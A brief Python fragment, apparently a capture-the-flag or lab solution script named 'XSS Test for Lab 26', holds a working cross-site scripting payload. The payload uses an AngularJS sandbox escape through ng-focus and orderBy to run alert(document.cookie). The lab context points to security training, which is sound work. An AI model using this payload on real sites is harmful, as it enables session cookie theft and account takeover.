...
def xss_test(url, use_proxy=False):
    try:
        ...
        payload =   f"<script> location = '{url}?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; </script>"
...
def main():
    parser = argparse.ArgumentParser(description='XSS Test for Lab 26')
